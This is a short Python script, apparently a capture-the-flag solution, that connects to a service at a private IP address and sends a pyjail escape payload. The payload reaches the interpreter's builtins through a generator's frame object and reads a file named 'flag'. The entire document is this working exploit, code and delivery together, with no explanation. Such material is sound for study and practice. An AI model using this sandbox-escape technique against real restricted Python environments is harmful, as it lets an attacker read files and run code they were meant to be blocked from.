import socket

HOST = '10.249.14.223'
PORT = 32774

code = "print((x:=(()for _ in())).gi_frame.f_builtins.open('flag').read())"
payload = code + ";" + code + "__" * 100

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall((payload + "\n").encode())
    while True:
        d = s.recv(4096)
        if not d: break
        print(d.decode())